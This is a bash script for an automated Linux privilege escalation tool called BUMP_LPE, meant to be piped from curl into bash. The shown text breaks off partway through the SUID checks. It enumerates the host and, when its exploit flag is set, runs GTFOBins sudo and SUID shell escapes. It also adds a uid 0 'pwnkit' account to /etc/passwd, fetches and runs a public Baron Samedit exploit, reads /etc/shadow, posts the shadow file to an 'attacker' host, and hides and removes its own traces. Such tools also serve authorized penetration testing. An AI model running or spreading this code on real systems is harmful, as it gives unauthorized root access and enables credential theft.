#!/bin/bash
# ============================================================================
#  BUMP_LPE - Automated Linux Privilege Escalation Toolkit
#  Version: 1.0.0
#  
#  Combines techniques from: traitor, linPEAS, lse.sh, AutoLocalPrivilegeEscalation
#  
#  Usage: curl <URL>/bump_lpe.sh | bash
#         curl <URL>/bump_lpe.sh | bash -s -- --exploit
#         curl <URL>/bump_lpe.sh | bash -s -- --scan-only
#
#  Flags:
#    --exploit       Automatically attempt exploitation of found vectors
#    --scan-only     Only enumerate, do not exploit
#    --aggressive    Try kernel exploits (may crash system)
#    --verbose / -v  Detailed output with extra enumeration data
#    --quiet         Minimal output
#    --no-color      Disable colored output
#    --help          Show this help
#
#  WARNING: Use only on systems you have explicit authorization to test.
#           Unauthorized access to computer systems is illegal.
# ============================================================================

VERSION="1.0.0"
SCRIPT_NAME="BUMP_LPE"

# ============================================================================
# GLOBALS
# ============================================================================
AUTO_EXPLOIT=false
SCAN_ONLY=false
AGGRESSIVE=false
QUIET=false
VERBOSE=false
NO_COLOR=false
GOT_ROOT=false
if [ -d /dev/shm ] && [ -w /dev/shm ]; then
  TMPDIR="/dev/shm/.b$$"
else
  TMPDIR="/tmp/.b$$"
fi
mkdir -p "$TMPDIR" 2>/dev/null
EXPLOIT_DIR="$TMPDIR/e"
VECTOR_COUNT_FILE="$TMPDIR/.vc"
VECTOR_LIST_FILE="$TMPDIR/.vl"
EXPLOIT_ATTEMPTS_FILE="$TMPDIR/.ea"
EXPLOIT_SUCCESSES_FILE="$TMPDIR/.es"
EXPLOIT_FAILURES_FILE="$TMPDIR/.ef"
: > "$VECTOR_COUNT_FILE"
: > "$VECTOR_LIST_FILE"
: > "$EXPLOIT_ATTEMPTS_FILE"
: > "$EXPLOIT_SUCCESSES_FILE"
: > "$EXPLOIT_FAILURES_FILE"

# ============================================================================
# COLORS
# ============================================================================
setup_colors() {
  if [ "$NO_COLOR" = true ] || [ ! -t 1 ]; then
    R="" G="" Y="" B="" M="" C="" W="" GR="" RST="" BOLD="" DIM=""
  else
    R='\033[0;31m'
    G='\033[0;32m'
    Y='\033[0;33m'
    B='\033[0;34m'
    M='\033[0;35m'
    C='\033[0;36m'
    W='\033[0;97m'
    GR='\033[0;90m'
    RST='\033[0m'
    BOLD='\033[1m'
    DIM='\033[2m'
    LR='\033[1;31m'
    LG='\033[1;32m'
    LY='\033[1;33m'
    LB='\033[1;34m'
    LM='\033[1;35m'
    LC='\033[1;36m'
    BG_R='\033[41m'
    BG_G='\033[42m'
    BG_Y='\033[43m'
  fi
}

# ============================================================================
# OUTPUT HELPERS
# ============================================================================
banner() {
  echo -e "${LG}"
  cat << 'BANNER'
   ───▄▄─▄████▄▐▄▄▄▌
   ──▐──████▀███▄█▄▌
   ▐─▌──█▀▌──▐▀▌▀█▀
   ─▀───▌─▌──▐─▌
   ─────█─█──▐▌█

    BUMP_LPE
BANNER
  echo -e "${RST}"
  echo -e "${GR}  Automated Linux Privilege Escalation Toolkit v${VERSION}${RST}"
  echo -e "${GR}  =================================================${RST}"
  echo ""
}

info()    { [ "$QUIET" != true ] && echo -e "${B}[*]${RST} $1"; }
verbose() { [ "$VERBOSE" = true ] && echo -e "${GR}[~]${RST} $1"; }
success() { echo -e "${LG}[+]${RST} $1"; }
warning() { echo -e "${LY}[!]${RST} $1"; }
error()   { echo -e "${LR}[-]${RST} $1"; }
critical(){ echo -e "${BG_R}${W}[!!!]${RST} ${LR}${BOLD}$1${RST}"; }
header()  { echo ""; echo -e "${LC}${BOLD}═══════════════════════════════════════════════════════════════${RST}"; echo -e "${LC}${BOLD}  $1${RST}"; echo -e "${LC}${BOLD}═══════════════════════════════════════════════════════════════${RST}"; }
subheader() { echo -e "${LM}  ─── $1 ───${RST}"; }

log() {
  :
}

found_vector() {
  echo "x" >> "$VECTOR_COUNT_FILE"
  echo "$1" >> "$VECTOR_LIST_FILE"
  critical "PRIVILEGE ESCALATION VECTOR FOUND: $1"
  log "VECTOR: $1"
}

get_vector_count() { wc -l < "$VECTOR_COUNT_FILE" 2>/dev/null | tr -d ' '; }
get_attempt_count() { wc -l < "$EXPLOIT_ATTEMPTS_FILE" 2>/dev/null | tr -d ' '; }
get_success_count() { wc -l < "$EXPLOIT_SUCCESSES_FILE" 2>/dev/null | tr -d ' '; }
get_failure_count() { wc -l < "$EXPLOIT_FAILURES_FILE" 2>/dev/null | tr -d ' '; }

exploit_attempt() {
  echo "x" >> "$EXPLOIT_ATTEMPTS_FILE"
  info "Exploiting: $1"
  log "EXPLOIT ATTEMPT: $1"
}

exploit_failed() {
  echo "x" >> "$EXPLOIT_FAILURES_FILE"
  warning "Exploit failed: $1"
  log "EXPLOIT FAILED: $1"
}

exploit_success() {
  echo "x" >> "$EXPLOIT_SUCCESSES_FILE"
  success "EXPLOIT SUCCEEDED: $1"
  log "EXPLOIT SUCCESS: $1"
}

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================
command_exists() { command -v "$1" >/dev/null 2>&1; }

download_file() {
  local url="$1"
  local output="$2"
  local retval=1
  
  if command_exists curl; then
    curl -fsSL --connect-timeout 10 --max-time 30 "$url" -o "$output" 2>/dev/null
    retval=$?
  elif command_exists wget; then
    wget -q --timeout=30 "$url" -O "$output" 2>/dev/null
    retval=$?
  elif command_exists fetch; then
    fetch -q -o "$output" "$url" 2>/dev/null
    retval=$?
  else
    error "No download tool available (curl/wget/fetch)"
    return 1
  fi
  
  # Verify download succeeded and file is not empty
  if [ $retval -ne 0 ] || [ ! -s "$output" ]; then
    warning "Download failed or empty: $url"
    rm -f "$output" 2>/dev/null
    return 1
  fi
  
  # Basic integrity check - ensure it's not an HTML error page
  if head -5 "$output" 2>/dev/null | grep -qi "<html\|<!DOCTYPE\|404 Not Found"; then
    warning "Downloaded file appears to be an error page: $url"
    rm -f "$output" 2>/dev/null
    return 1
  fi
  
  return 0
}

compile_exploit() {
  local src="$1"
  local bin="$2"
  if command_exists gcc; then
    gcc -o "$bin" "$src" -lpthread 2>/dev/null && chmod +x "$bin" && return 0
  elif command_exists cc; then
    cc -o "$bin" "$src" -lpthread 2>/dev/null && chmod +x "$bin" && return 0
  fi
  return 1
}

is_root() { [ "$(id -u)" -eq 0 ]; }

verify_suid_root() {
  local f="$1"
  [ -f "$f" ] || return 1
  [ -u "$f" ] || return 1
  local owner_uid
  owner_uid=$(stat -c '%u' "$f" 2>/dev/null || stat -f '%u' "$f" 2>/dev/null)
  [ "$owner_uid" = "0" ] && return 0
  warning "SUID file $f exists but owned by uid=$owner_uid (not root) - useless"
  rm -f "$f" 2>/dev/null
  return 1
}

try_rootbash() {
  if verify_suid_root /tmp/rootbash; then
    success "Root SUID shell ready: /tmp/rootbash -p"
    /tmp/rootbash -p 2>/dev/null
    if check_root_shell; then return 0; fi
  fi
  return 1
}

check_root_shell() {
  if is_root; then
    GOT_ROOT=true
    echo ""
    critical "ROOT SHELL OBTAINED!"
    echo -e "${LG}${BOLD}"
    cat << 'ROOT'
    ╔═══════════════════════════════════════╗
    ║     ROOT ACCESS ACHIEVED!             ║
    ║     uid=0(root) gid=0(root)           ║
    ╚═══════════════════════════════════════╝
ROOT
    echo -e "${RST}"
    id
    return 0
  fi
  return 1
}

cleanup() {
  rm -rf "$TMPDIR" 2>/dev/null
  rm -f /tmp/pwnkit_proof.txt 2>/dev/null
  rm -f /tmp/bump_lpe.sh /tmp/bump_lpe2.sh 2>/dev/null
}

# ============================================================================
# PARSE ARGUMENTS
# ============================================================================
parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      --exploit)    AUTO_EXPLOIT=true ;;
      --scan-only)  SCAN_ONLY=true ;;
      --aggressive) AGGRESSIVE=true; AUTO_EXPLOIT=true ;;
      --quiet)      QUIET=true ;;
      --verbose|-v) VERBOSE=true ;;
      --no-color)   NO_COLOR=true ;;
      --help|-h)    show_help; exit 0 ;;
      *) ;;
    esac
    shift
  done
}

show_help() {
  echo "Usage: $0 [OPTIONS]"
  echo ""
  echo "Options:"
  echo "  --exploit       Automatically attempt exploitation"
  echo "  --scan-only     Only enumerate, do not exploit"
  echo "  --aggressive    Try kernel exploits (may crash system)"
  echo "  --verbose, -v   Show detailed output for every check"
  echo "  --quiet         Minimal output"
  echo "  --no-color      Disable colored output"
  echo "  --help          Show this help"
  echo ""
  echo "Examples:"
  echo "  curl <URL>/bump_lpe.sh | bash"
  echo "  curl <URL>/bump_lpe.sh | bash -s -- --exploit"
  echo "  curl <URL>/bump_lpe.sh | bash -s -- --scan-only"
}

# ============================================================================
# SYSTEM INFORMATION GATHERING
# ============================================================================
gather_system_info() {
  header "SYSTEM INFORMATION"
  
  SYS_HOSTNAME=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null)
  SYS_KERNEL=$(uname -r 2>/dev/null)
  SYS_KERNEL_FULL=$(uname -a 2>/dev/null)
  SYS_ARCH=$(uname -m 2>/dev/null)
  SYS_OS=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)
  [ -z "$SYS_OS" ] && SYS_OS=$(cat /etc/issue 2>/dev/null | head -1)
  SYS_USER=$(whoami 2>/dev/null || id -un 2>/dev/null)
  SYS_UID=$(id -u 2>/dev/null)
  SYS_GROUPS=$(id 2>/dev/null)
  SYS_SHELL=$SHELL
  SYS_PATH=$PATH
  
  info "Hostname:     ${W}$SYS_HOSTNAME${RST}"
  info "OS:           ${W}$SYS_OS${RST}"
  info "Kernel:       ${W}$SYS_KERNEL${RST}"
  info "Architecture: ${W}$SYS_ARCH${RST}"
  info "User:         ${W}$SYS_USER${RST} (uid=$SYS_UID)"
  info "Groups:       ${W}$SYS_GROUPS${RST}"
  info "Shell:        ${W}$SYS_SHELL${RST}"
  info "PATH:         ${GR}$SYS_PATH${RST}"
  
  if [ "$VERBOSE" = true ]; then
    verbose "Full uname: $SYS_KERNEL_FULL"
    verbose "Uptime: $(uptime 2>/dev/null)"
    verbose "CPU: $(grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d: -f2 | xargs)"
    verbose "Memory: $(free -h 2>/dev/null | grep Mem | awk '{print $2 " total, " $3 " used, " $4 " free"}')"
    verbose "Disk: $(df -h / 2>/dev/null | tail -1 | awk '{print $2 " total, " $3 " used, " $4 " free (" $5 ")"}')"
    verbose "SELinux: $(getenforce 2>/dev/null || echo 'not available')"
    verbose "AppArmor: $(aa-status --enabled 2>/dev/null && echo 'enabled' || echo 'not available')"
    verbose "Seccomp: $(grep Seccomp /proc/self/status 2>/dev/null | awk '{print $2}')"
    verbose "Compiler: $(gcc --version 2>/dev/null | head -1 || echo 'gcc not found')"
    verbose "Installed shells:"
    cat /etc/shells 2>/dev/null | grep -v "^#" | while IFS= read -r sh; do
      verbose "  $sh"
    done
    verbose "Logged in users:"
    w 2>/dev/null | tail -n +3 | while IFS= read -r line; do
      verbose "  $line"
    done
  fi
  
  if is_root; then
    critical "Already running as root!"
    GOT_ROOT=true
    return
  fi
  
  # Check if in Docker / LXC / container
  CONTAINER=""
  if [ -f /.dockerenv ]; then
    CONTAINER="docker"
    warning "Running inside Docker container"
  elif grep -qa 'lxc' /proc/1/cgroup 2>/dev/null; then
    CONTAINER="lxc"
    warning "Running inside LXC container"
  elif grep -qa 'containerd' /proc/1/cgroup 2>/dev/null; then
    CONTAINER="containerd"
    warning "Running inside containerd"
  fi
  
  verbose "Cgroup: $(cat /proc/1/cgroup 2>/dev/null | head -3)"
  
  log "System: $SYS_HOSTNAME | $SYS_OS | $SYS_KERNEL | $SYS_ARCH | user=$SYS_USER"
}

# ============================================================================
# 1. SUDO CHECKS
# ============================================================================
check_sudo() {
  header "SUDO PRIVILEGE CHECKS"
  
  # Check if sudo exists
  if ! command_exists sudo; then
    info "sudo not found on system"
    return
  fi
  
  # Check sudo version for CVEs
  SUDO_VERSION=$(sudo -V 2>/dev/null | head -1 | grep -oP '[\d.]+' | head -1)
  info "Sudo version: ${W}$SUDO_VERSION${RST}"
  verbose "Sudo binary: $(command -v sudo 2>/dev/null)"
  verbose "Sudo full version: $(sudo --version 2>/dev/null | head -3)"
  
  # CVE-2021-3156 (Baron Samedit) - sudo < 1.9.5p2
  if [ -n "$SUDO_VERSION" ]; then
    SUDO_MAJOR=$(echo "$SUDO_VERSION" | cut -d. -f1)
    SUDO_MINOR=$(echo "$SUDO_VERSION" | cut -d. -f2)
    SUDO_PATCH=$(echo "$SUDO_VERSION" | cut -d. -f3 | sed 's/p.*//')
    
    if [ "$SUDO_MAJOR" -eq 1 ] && [ "$SUDO_MINOR" -le 9 ]; then
      if [ "$SUDO_MINOR" -lt 9 ] || [ "${SUDO_PATCH:-0}" -lt 5 ]; then
        found_vector "CVE-2021-3156 (Baron Samedit) - sudo $SUDO_VERSION"
        warning "Sudo version may be vulnerable to heap-based buffer overflow"
        if [ "$AUTO_EXPLOIT" = true ]; then
          exploit_baron_samedit
        fi
      fi
    fi
    
    # CVE-2019-14287 - sudo < 1.8.28
    if [ "$SUDO_MAJOR" -eq 1 ] && [ "$SUDO_MINOR" -eq 8 ]; then
      if [ "${SUDO_PATCH:-0}" -lt 28 ]; then
        found_vector "CVE-2019-14287 - sudo $SUDO_VERSION (run as user -1)"
        if [ "$AUTO_EXPLOIT" = true ]; then
          exploit_attempt "CVE-2019-14287 sudo -u#-1"
          sudo -n -u#-1 /bin/bash 2>/dev/null
          if check_root_shell; then exploit_success "CVE-2019-14287"; return; fi
          exploit_failed "CVE-2019-14287"
        else
          info "Try: sudo -u#-1 /bin/bash"
        fi
      fi
    fi
  fi
  
  # Check sudo -l (without password)
  subheader "Sudo privileges (no password)"
  SUDO_L=$(sudo -ln 2>/dev/null)
  if [ -n "$SUDO_L" ]; then
    echo "$SUDO_L" | while IFS= read -r line; do
      echo -e "  ${GR}$line${RST}"
    done
    
    # Check for NOPASSWD entries
    NOPASSWD_CMDS=$(echo "$SUDO_L" | grep -i "NOPASSWD" | grep -v "^$")
    if [ -n "$NOPASSWD_CMDS" ]; then
      found_vector "NOPASSWD sudo entries found"
      echo "$NOPASSWD_CMDS"
      
      if [ "$AUTO_EXPLOIT" = true ]; then
        exploit_sudo_nopasswd "$NOPASSWD_CMDS"
      fi
    fi
    
    # Check for ALL privileges
    if echo "$SUDO_L" | grep -q "(ALL.*ALL)"; then
      if echo "$SUDO_L" | grep -q "NOPASSWD"; then
        found_vector "Full sudo NOPASSWD access"
        if [ "$AUTO_EXPLOIT" = true ]; then
          exploit_attempt "Full NOPASSWD sudo -> root shell"
          sudo -n /bin/bash -c 'id' 2>/dev/null && { exploit_success "sudo NOPASSWD"; exec sudo -n /bin/bash; }
          exploit_failed "sudo NOPASSWD (access denied)"
        fi
      fi
    fi
    
    # Check for specific exploitable sudo commands
    check_sudo_gtfobins "$SUDO_L"
  else
    info "Cannot check sudo privileges without password"
  fi
  
  # Check sudo token reuse
  if sudo -n true 2>/dev/null; then
    found_vector "Sudo token is cached (no password needed)"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exec sudo -n /bin/bash
    fi
  fi
}

# ============================================================================
# SUDO GTFOBINS EXPLOITATION
# ============================================================================
check_sudo_gtfobins() {
  local sudo_output="$1"
  
  subheader "Checking GTFOBins sudo exploits"
  
  # Map of commands to their GTFOBins exploitation
  declare -A GTFO_SUDO 2>/dev/null || return
  
  GTFO_SUDO[env]="sudo -n env /bin/bash"
  GTFO_SUDO[find]="sudo -n find /dev/null -exec /bin/bash \\;"
  GTFO_SUDO[awk]="sudo -n awk 'BEGIN {system(\"/bin/bash\")}'"
  GTFO_SUDO[gawk]="sudo -n gawk 'BEGIN {system(\"/bin/bash\")}'"
  GTFO_SUDO[perl]="sudo -n perl -e 'exec \"/bin/bash\";'"
  GTFO_SUDO[python]="sudo -n python -c 'import os; os.execl(\"/bin/bash\", \"bash\")'"
  GTFO_SUDO[python3]="sudo -n python3 -c 'import os; os.execl(\"/bin/bash\", \"bash\")'"
  GTFO_SUDO[ruby]="sudo -n ruby -e 'exec \"/bin/bash\"'"
  GTFO_SUDO[lua]="sudo -n lua -e 'os.execute(\"/bin/bash\")'"
  GTFO_SUDO[vi]="sudo -n vi -c ':!bash'"
  GTFO_SUDO[vim]="sudo -n vim -c ':!bash'"
  GTFO_SUDO[nmap]="sudo -n nmap --interactive"
  GTFO_SUDO[man]="sudo -n man man"
  GTFO_SUDO[less]="sudo -n less /etc/passwd"
  GTFO_SUDO[more]="sudo -n more /etc/passwd"
  GTFO_SUDO[ftp]="sudo -n ftp"
  GTFO_SUDO[socat]="sudo -n socat stdin exec:/bin/bash"
  GTFO_SUDO[zip]="sudo -n zip /tmp/x.zip /dev/null -T --unzip-command='bash -c bash'"
  GTFO_SUDO[tar]="sudo -n tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
  GTFO_SUDO[tee]="echo 'root2:\$1\$xyz\$hashedpw:0:0::/root:/bin/bash' | sudo -n tee -a /etc/passwd"
  GTFO_SUDO[cp]="sudo -n cp /bin/bash /tmp/rootbash && sudo -n chmod +s /tmp/rootbash && /tmp/rootbash -p"
  GTFO_SUDO[mv]="sudo -n mv /bin/bash /tmp/rootbash"
  GTFO_SUDO[nano]="sudo -n nano /etc/shadow"
  GTFO_SUDO[ed]="sudo -n ed"
  GTFO_SUDO[sed]="sudo -n sed -n '1e exec bash 1>&0' /etc/hosts"
  GTFO_SUDO[git]="sudo -n git -p help config"
  GTFO_SUDO[ssh]="sudo -n ssh -o ProxyCommand=';bash 0<&2 1>&2' x"
  GTFO_SUDO[scp]="TF=\$(mktemp); echo 'bash 0<&2 1>&2' > \$TF; chmod +x \$TF; sudo -n scp -S \$TF x y:"
  GTFO_SUDO[wget]="sudo -n wget --post-file=/etc/shadow http://attacker/"
  GTFO_SUDO[curl]="sudo -n curl file:///etc/shadow"
  GTFO_SUDO[php]="sudo -n php -r 'system(\"/bin/bash\");'"
  GTFO_SUDO[node]="sudo -n node -e 'require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"
  GTFO_SUDO[docker]="sudo -n docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
  GTFO_SUDO[strace]="sudo -n strace -o /dev/null /bin/bash"
  GTFO_SUDO[ltrace]="sudo -n ltrace -b -L /bin/bash"
  GTFO_SUDO[nice]="sudo -n nice /bin/bash"
  GTFO_SUDO[ionice]="sudo -n ionice /bin/bash"
  GTFO_SUDO[time]="sudo -n /usr/bin/time /bin/bash"
  GTFO_SUDO[timeout]="sudo -n timeout --foreground 9999 /bin/bash"
  GTFO_SUDO[stdbuf]="sudo -n stdbuf -i0 /bin/bash"
  GTFO_SUDO[xargs]="sudo -n xargs -a /dev/null /bin/bash"
  GTFO_SUDO[taskset]="sudo -n taskset 1 /bin/bash"
  GTFO_SUDO[expect]="sudo -n expect -c 'spawn /bin/bash;interact'"
  GTFO_SUDO[screen]="sudo -n screen"
  GTFO_SUDO[tmux]="sudo -n tmux"
  GTFO_SUDO[script]="sudo -n script -q /dev/null"
  GTFO_SUDO[nsenter]="sudo -n nsenter /bin/bash"
  GTFO_SUDO[cpulimit]="sudo -n cpulimit -l 100 -f /bin/bash"
  GTFO_SUDO[dmesg]="sudo -n dmesg -H"
  GTFO_SUDO[journalctl]="sudo -n journalctl"
  GTFO_SUDO[mysql]="sudo -n mysql -e '\\! /bin/bash'"
  GTFO_SUDO[psql]="sudo -n psql -c '\\! /bin/bash'"
  GTFO_SUDO[sqlite3]="sudo -n sqlite3 /dev/null '.shell /bin/bash'"
  GTFO_SUDO[apache2]="sudo -n apache2 -f /etc/shadow"
  GTFO_SUDO[rpm]="sudo -n rpm --eval '%{lua:os.execute(\"/bin/bash\")}'"
  GTFO_SUDO[dpkg]="sudo -n dpkg -l"
  GTFO_SUDO[apt]="sudo -n apt changelog apt"
  GTFO_SUDO[apt-get]="sudo -n apt-get changelog apt"
  GTFO_SUDO[pip]="TF=\$(mktemp -d); echo 'import os;os.execl(\"/bin/bash\",\"bash\")' > \$TF/setup.py; sudo -n pip install \$TF"
  GTFO_SUDO[pip3]="TF=\$(mktemp -d); echo 'import os;os.execl(\"/bin/bash\",\"bash\")' > \$TF/setup.py; sudo -n pip3 install \$TF"
  GTFO_SUDO[flock]="sudo -n flock -u / /bin/bash"
  GTFO_SUDO[gcc]="sudo -n gcc -wrapper /bin/bash,-s ."
  GTFO_SUDO[gdb]="sudo -n gdb -nx -ex '!bash' -ex quit"
  GTFO_SUDO[valgrind]="sudo -n valgrind /bin/bash"
  GTFO_SUDO[tclsh]="sudo -n tclsh"
  GTFO_SUDO[wish]="sudo -n wish"
  GTFO_SUDO[rlwrap]="sudo -n rlwrap /bin/bash"
  GTFO_SUDO[busybox]="sudo -n busybox sh"
  GTFO_SUDO[ash]="sudo -n ash"
  GTFO_SUDO[csh]="sudo -n csh"
  GTFO_SUDO[dash]="sudo -n dash"
  GTFO_SUDO[ksh]="sudo -n ksh"
  GTFO_SUDO[zsh]="sudo -n zsh"
  GTFO_SUDO[bash]="sudo -n bash"
  GTFO_SUDO[sh]="sudo -n sh"
  GTFO_SUDO[rsync]="sudo -n rsync -e 'bash -c bash 0<&2 1>&2' 127.0.0.1:/dev/null"
  GTFO_SUDO[openssl]="LFILE=/etc/shadow; sudo -n openssl enc -in \"\$LFILE\""
  GTFO_SUDO[base64]="sudo -n base64 /etc/shadow | base64 -d"
  GTFO_SUDO[xxd]="sudo -n xxd /etc/shadow | xxd -r"
  GTFO_SUDO[dd]="sudo -n dd if=/etc/shadow"
  GTFO_SUDO[systemctl]="sudo -n systemctl"
  GTFO_SUDO[service]="sudo -n service ../../bin/bash ."
  GTFO_SUDO[mount]="sudo -n mount -o bind /bin/bash /bin/mount"
  GTFO_SUDO[chroot]="sudo -n chroot / /bin/bash"
  GTFO_SUDO[snap]="sudo -n snap install micro --classic"
  GTFO_SUDO[restic]="sudo -n restic backup -r /tmp/backup --password-command='bash -i >&2 0>&2'"
  
  for cmd in "${!GTFO_SUDO[@]}"; do
    if echo "$sudo_output" | grep -qwi "$cmd"; then
      local bin_path=$(command -v "$cmd" 2>/dev/null)
      if [ -n "$bin_path" ] && echo "$sudo_output" | grep -q "$bin_path\|($cmd)"; then
        found_vector "Sudo GTFOBins: $cmd"
        success "Exploit: ${GTFO_SUDO[$cmd]}"
        
        if [ "$AUTO_EXPLOIT" = true ] && [ "$SCAN_ONLY" != true ]; then
          exploit_attempt "GTFOBins sudo $cmd"
          eval "${GTFO_SUDO[$cmd]}" 2>/dev/null
          if check_root_shell; then exploit_success "GTFOBins sudo $cmd"; return; fi
          exploit_failed "GTFOBins sudo $cmd"
        fi
      fi
    fi
  done
}

exploit_sudo_nopasswd() {
  local cmds="$1"
  info "Analyzing NOPASSWD commands for exploitation..."
  
  # Extract individual commands from NOPASSWD entries
  echo "$cmds" | grep -oP '/\S+' | sort -u | while IFS= read -r cmd; do
    local binname=$(basename "$cmd")
    
    case "$binname" in
      bash|sh|dash|ash|zsh|csh|ksh)
        exploit_attempt "sudo $binname -> direct shell"
        sudo -n "$cmd" 2>/dev/null
        if check_root_shell; then exploit_success "sudo $binname"; return; fi
        exploit_failed "sudo $binname"
        ;;
      env)
        exploit_attempt "sudo env -> shell"
        sudo -n env /bin/bash 2>/dev/null
        if check_root_shell; then exploit_success "sudo env"; return; fi
        exploit_failed "sudo env"
        ;;
      find)
        exploit_attempt "sudo find -> shell"
        sudo -n find /dev/null -exec /bin/bash \; 2>/dev/null
        if check_root_shell; then exploit_success "sudo find"; return; fi
        exploit_failed "sudo find"
        ;;
      python|python3)
        exploit_attempt "sudo $binname -> shell"
        sudo -n "$cmd" -c 'import os; os.execl("/bin/bash","bash")' 2>/dev/null
        if check_root_shell; then exploit_success "sudo $binname"; return; fi
        exploit_failed "sudo $binname"
        ;;
      perl)
        exploit_attempt "sudo perl -> shell"
        sudo -n "$cmd" -e 'exec "/bin/bash";' 2>/dev/null
        if check_root_shell; then exploit_success "sudo perl"; return; fi
        exploit_failed "sudo perl"
        ;;
      ruby)
        exploit_attempt "sudo ruby -> shell"
        sudo -n "$cmd" -e 'exec "/bin/bash"' 2>/dev/null
        if check_root_shell; then exploit_success "sudo ruby"; return; fi
        exploit_failed "sudo ruby"
        ;;
      vim|vi)
        exploit_attempt "sudo $binname -> shell"
        sudo -n "$cmd" -c ':!bash' 2>/dev/null
        if check_root_shell; then exploit_success "sudo $binname"; return; fi
        exploit_failed "sudo $binname"
        ;;
      awk|gawk|mawk)
        exploit_attempt "sudo $binname -> shell"
        sudo -n "$cmd" 'BEGIN {system("/bin/bash")}' 2>/dev/null
        if check_root_shell; then exploit_success "sudo $binname"; return; fi
        exploit_failed "sudo $binname"
        ;;
      less|more)
        found_vector "sudo $binname available (manual: sudo $cmd /etc/passwd, then !bash)"
        ;;
      docker)
        exploit_attempt "sudo docker -> container breakout"
        sudo -n docker run -v /:/mnt --rm -it alpine chroot /mnt bash 2>/dev/null
        if check_root_shell; then exploit_success "sudo docker"; return; fi
        exploit_failed "sudo docker"
        ;;
      cp)
        exploit_attempt "sudo cp -> SUID bash"
        sudo -n cp /bin/bash /tmp/rootbash 2>/dev/null && sudo -n chmod +s /tmp/rootbash 2>/dev/null
        if verify_suid_root /tmp/rootbash; then
          /tmp/rootbash -p 2>/dev/null
          if check_root_shell; then exploit_success "sudo cp SUID bash"; return; fi
        fi
        exploit_failed "sudo cp"
        ;;
      tee)
        exploit_attempt "sudo tee -> /etc/passwd root user"
        local hash=$(openssl passwd -1 -salt pwnkit pwnkit 2>/dev/null)
        if [ -n "$hash" ]; then
          echo "pwnkit:${hash}:0:0:root:/root:/bin/bash" | sudo -n tee -a /etc/passwd >/dev/null 2>&1
          exploit_success "sudo tee -> added pwnkit:pwnkit uid=0. Run: su pwnkit"
        else
          exploit_failed "sudo tee (no openssl)"
        fi
        ;;
      wget)
        exploit_attempt "sudo wget -> read /etc/shadow"
        sudo -n wget -q -O- file:///etc/shadow 2>/dev/null
        ;;
      curl)
        exploit_attempt "sudo curl -> read /etc/shadow"
        sudo -n curl -s file:///etc/shadow 2>/dev/null
        ;;
      *)
        warning "NOPASSWD command $cmd - check GTFOBins manually"
        ;;
    esac
  done
}

exploit_baron_samedit() {
  exploit_attempt "CVE-2021-3156 (Baron Samedit)"
  
  local exploit_url="https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit_nss.py"
  local exploit_file="$EXPLOIT_DIR/baron_samedit.py"
  
  if command_exists python3; then
    download_file "$exploit_url" "$exploit_file"
    if [ -f "$exploit_file" ]; then
      python3 "$exploit_file" 2>/dev/null
      check_root_shell && return
    fi
  fi
  
  warning "Baron Samedit auto-exploit failed, try manually"
}

# ============================================================================
# 2. SUID/SGID BINARY CHECKS
# ============================================================================
check_suid() {
  header "SUID/SGID BINARY CHECKS"
  
  subheader "Finding SUID binaries"
  SUID_BINS=$(timeout 10 find / -perm -4000 -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" 2>/dev/null)
  
  if [ -z "$SUID_BINS" ]; then
    info "No SUID binaries found"
    return
  fi
  
  local suid_count=$(echo "$SUID_BINS" | wc -l)
  info "Found ${W}${suid_count}${RST} SUID binaries"
  
  if [ "$VERBOSE" = true ]; then
    verbose "Complete SUID binary list:"
    echo "$SUID_BINS" | while IFS= read -r bin; do
      local perms=$(ls -la "$bin" 2>/dev/null | awk '{print $1, $3, $4}')
      verbose "  $bin ($perms)"
    done
    echo ""
  fi
  
  # Known safe SUID binaries to skip
  SAFE_SUID="/bin/su /usr/bin/su /bin/mount /usr/bin/mount /bin/umount /usr/bin/umount \
/bin/ping /usr/bin/ping /bin/ping6 /usr/bin/ping6 /usr/bin/passwd /usr/bin/chfn \
/usr/bin/chsh /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/sudo /usr/bin/sudoedit \
/usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper \
/usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/eject/dmcrypt-get-device \
/usr/bin/pkexec /usr/bin/crontab /usr/bin/at /usr/bin/expiry /usr/bin/wall \
/usr/bin/write /usr/bin/ssh-agent /usr/sbin/pppd /usr/sbin/unix_chkpwd \
/usr/bin/traceroute6.iputils /usr/bin/fusermount /usr/bin/fusermount3 \
/snap/core"

  # GTFOBins SUID exploitable binaries
  declare -A GTFO_SUID 2>/dev/null || {
    # Fallback for shells without associative arrays
    check_suid_fallback "$SUID_BINS"
    return
  }
  
  GTFO_SUID[ar]="ar r /dev/null /etc/shadow; cat /dev/null"
  GTFO_SUID[aria2c]="COMMAND='id'; TF=\$(mktemp); echo \"\$COMMAND\" > \$TF; chmod +x \$TF; aria2c --on-download-error=\$TF http://x"
  GTFO_SUID[ash]="./ash -p"
  GTFO_SUID[base32]="base32 /etc/shadow | base32 -d"
  GTFO_SUID[base64]="base64 /etc/shadow | base64 -d"
  GTFO_SUID[bash]="bash -p"
  GTFO_SUID[busybox]="busybox sh -p"
  GTFO_SUID[cat]="cat /etc/shadow"
  GTFO_SUID[chmod]="chmod 4755 /bin/bash; /bin/bash -p"
  GTFO_SUID[chown]="chown \$(id -un):\$(id -gn) /etc/shadow"
  GTFO_SUID[cp]="cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p"
  GTFO_SUID[csh]="csh -b"
  GTFO_SUID[curl]="curl file:///etc/shadow"
  GTFO_SUID[cut]="cut -d '' -f1 /etc/shadow"
  GTFO_SUID[dash]="dash -p"
  GTFO_SUID[date]="date -f /etc/shadow"
  GTFO_SUID[dd]="dd if=/etc/shadow"
  GTFO_SUID[dialog]="dialog --textbox /etc/shadow 0 0"
